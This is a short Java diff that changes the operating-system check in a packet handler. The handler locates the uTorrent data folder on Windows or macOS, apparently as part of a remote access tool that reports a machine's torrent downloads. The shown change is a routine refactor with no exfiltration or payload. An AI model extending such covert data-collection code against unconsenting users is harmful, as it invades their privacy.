@@ -13,9 +13,9 @@ public class Packet57UTorrentDownloads extends AbstractIncomingPacket {
 	@Override
 	public void read() throws Exception {
 		File dir = null;
-		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 			dir = new File(System.getenv("APPDATA") + "\\uTorrent\\");
-		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 			dir = new File(System.getProperty("user.home") + "/Library/Application Support/uTorrent/");
 		}
 
